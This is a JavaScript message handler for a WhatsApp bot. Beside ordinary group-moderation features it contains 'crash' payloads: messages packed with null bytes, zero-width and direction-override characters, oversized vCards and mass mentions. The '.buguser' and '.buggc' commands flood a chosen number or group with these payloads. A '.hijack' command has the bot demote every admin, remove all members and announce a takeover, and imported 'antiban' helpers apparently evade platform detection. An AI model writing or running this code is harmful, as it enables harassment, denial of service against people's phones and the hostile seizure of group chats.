const { OWNER_NUMBER, BAD_WORDS, BOT_NAME, OWNER_NAME } = require('./config')
const state = require('./state')
const { handleCommand } = require('./commands')
const { safeSend, humanDelay } = require('./antiban')

const OWNER = OWNER_NUMBER + '@s.whatsapp.net'

// Flood payloads
const floodPayloads = [
    () => ({ text: '\u0000'.repeat(5000) + '꧔ꦿ'.repeat(2000) }),
    () => ({
        contacts: {
            displayName: '​'.repeat(3000),
            contacts: Array(150).fill({
                vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:${'​'.repeat(800)}\nTEL:+${'9'.repeat(300)}\nEND:VCARD`
            })
        }
    }),
    () => ({ text: '᷂᷿᷄᷾'.repeat(3000) + '\u202E'.repeat(2000) }),
    () => ({ text: '\u200B\u200C\u200D\uFEFF'.repeat(4000) }),
    () => ({ text: '𒐫'.repeat(4000) + '\u0000'.repeat(1000) }),
    () => ({ text: '@0000000000 '.repeat(500), mentions: Array(500).fill('0000000000@s.whatsapp.net') }),
    () => ({ text: '🔥💥⚡🌀'.repeat(3000) }),
    () => ({ text: '\u202E' + 'TAVIK'.repeat(2000) + '\u202C'.repeat(2000) })
]

async function floodTarget(sock, jid, count = 200) {
    state.floodActive[jid] = true
    let sent = 0
    while (state.floodActive[jid] && sent < count) {
        try {
            await sock.sendMessage(jid, floodPayloads[sent % floodPayloads.length]())
            if (sent % 5 !== 0) await new Promise(r => setTimeout(r, 100))
            sent++
        } catch (e) { await new Promise(r => setTimeout(r, 200)) }
    }
    state.floodActive[jid] = false
    return sent
}

async function hijackGroup(sock, jid) {
    try {
        const meta = await sock.groupMetadata(jid)
        const botId = sock.user.id.split(':')[0] + '@s.whatsapp.net'
        const admins = meta.participants.filter(p => p.admin && p.id !== botId).map(p => p.id)
        const members = meta.participants.filter(p => p.id !== botId).map(p => p.id)
        try { await sock.groupParticipantsUpdate(jid, [botId], 'promote') } catch (e) {}
        if (admins.length > 0) await sock.groupParticipantsUpdate(jid, admins, 'demote').catch(() => {})
        const chunks = []
        for (let i = 0; i < members.length; i += 5) chunks.push(members.slice(i, i + 5))
        for (const chunk of chunks) {
            await sock.groupParticipantsUpdate(jid, chunk, 'remove').catch(() => {})
            await humanDelay()
        }
        await safeSend(sock, jid, { text: `⚡ *${BOT_NAME}* has taken over!\n👑 Now owned by ${OWNER_NAME}` })
        return true
    } catch (e) { return false }
}

async function handleMessage(sock, msg) {
    try {
        if (!msg.message) return

        const from = msg.key.remoteJid
        const sender = msg.key.participant || msg.key.remoteJid
        const senderNumber = sender.split('@')[0]
        const isOwner = sender === OWNER
        const isSudo = state.sudoUsers.includes(senderNumber)
        const isPrivileged = isOwner || isSudo
        const isGroup = from.endsWith('@g.us')
        const pushName = msg.pushName || 'User'

        const text = msg.message?.conversation ||
                     msg.message?.extendedTextMessage?.text || ''
        const args = text.trim().split(' ')
        const cmd = args[0].toLowerCase()

        // ======= AUTO READ =======
        if (state.autoread) await sock.readMessages([msg.key])

        // ======= AUTO REACT =======
        if (state.autoreact && text) {
            const emojis = ['❤️', '😂', '🔥', '⚡', '👍', '🎉']
            await sock.sendMessage(from, {
                react: { text: emojis[Math.floor(Math.random() * emojis.length)], key: msg.key }
            })
        }

        // ======= AUTO TYPING =======
        if (state.autotyping && text) {
            await sock.sendPresenceUpdate('composing', from)
            await new Promise(r => setTimeout(r, 1000))
            await sock.sendPresenceUpdate('paused', from)
        }

        // ======= ANTI LINK =======
        if (isGroup && state.antilink[from] && !isPrivileged) {
            const hasLink = /(https?:\/\/|wa\.me|chat\.whatsapp\.com)/i.test(text)
            if (hasLink) {
                await sock.sendMessage(from, { delete: msg.key })
                await safeSend(sock, from, {
                    text: `⚠️ @${senderNumber} No links allowed!`,
                    mentions: [sender]
                })
                return
            }
        }

        // ======= ANTI SPAM =======
        if (isGroup && state.antispam[from] && !isPrivileged) {
            const key = `${from}_${senderNumber}`
            if (!state.spamCount[key]) state.spamCount[key] = { count: 0, time: Date.now() }
            if (Date.now() - state.spamCount[key].time > 5000) {
                state.spamCount[key] = { count: 0, time: Date.now() }
            }
            state.spamCount[key].count++
            if (state.spamCount[key].count > 5) {
                await sock.groupParticipantsUpdate(from, [sender], 'remove').catch(() => {})
                await safeSend(sock, from, { text: `⚠️ @${senderNumber} kicked for spamming!`, mentions: [sender] })
                return
            }
        }

        // ======= ANTI BAD WORD =======
        if (isGroup && state.antibadword[from] && !isPrivileged) {
            const hasBadWord = BAD_WORDS.some(w => text.toLowerCase().includes(w))
            if (hasBadWord) {
                await sock.sendMessage(from, { delete: msg.key })
                await safeSend(sock, from, {
                    text: `⚠️ @${senderNumber} Watch your language!`,
                    mentions: [sender]
                })
                return
            }
        }

        // ======= AUTO REPLY =======
        if (state.autoreply[from] && text && !text.startsWith('.')) {
            const { askAI } = require('./utils')
            const aiReply = await askAI(text)
            await safeSend(sock, from, { text: aiReply }, { quoted: msg })
            return
        }

        if (!text.startsWith('.')) return

        // ======= BUG/FLOOD COMMANDS =======
        if (cmd === '.buguser' && isPrivileged) {
            let target = args[1]?.replace(/[^0-9]/g, '')
            const replyJid = msg.message?.extendedTextMessage?.contextInfo?.participant
            if (!target && replyJid) target = replyJid.split('@')[0]
            if (!target) return safeSend(sock, from, { text: '❌ Usage: .buguser number [count]' }, { quoted: msg })
            const count = parseInt(args[2]) || 200
            await safeSend(sock, from, { text: `🐛 Flooding ${target}...` }, { quoted: msg })
            const sent = await floodTarget(sock, target + '@s.whatsapp.net', count)
            await safeSend(sock, from, { text: `✅ Sent ${sent} messages to ${target}` }, { quoted: msg })
            return
        }

        if (cmd === '.buggc' && isPrivileged) {
            if (!isGroup) return safeSend(sock, from, { text: '❌ Use in a group!' }, { quoted: msg })
            const count = parseInt(args[1]) || 200
            await safeSend(sock, from, { text: `🐛 Flooding group...` }, { quoted: msg })
            const sent = await floodTarget(sock, from, count)
            await safeSend(sock, from, { text: `✅ Sent ${sent} messages!` }, { quoted: msg })
            return
        }

        if (cmd === '.stopflood' && isPrivileged) {
            const target = args[1]?.replace(/[^0-9]/g, '')
            state.floodActive[target ? target + '@s.whatsapp.net' : from] = false
            await safeSend(sock, from, { text: '🛑 Flood stopped!' }, { quoted: msg })
            return
        }

        if (cmd === '.hijack' && isOwner) {
            if (!isGroup) return safeSend(sock, from, { text: '❌ Use in a group!' }, { quoted: msg })
            await safeSend(sock, from, { text: '⚡ Hijacking...' }, { quoted: msg })
            const result = await hijackGroup(sock, from)
            if (!result) await safeSend(sock, from, { text: '❌ Failed!' }, { quoted: msg })
            return
        }

        // Handle all other commands
        await handleCommand(sock, msg, from, sender, isOwner, isSudo, isGroup, pushName)

    } catch (err) {
        console.log('Handler Error:', err.message)
    }
}

module.exports = { handleMessage }
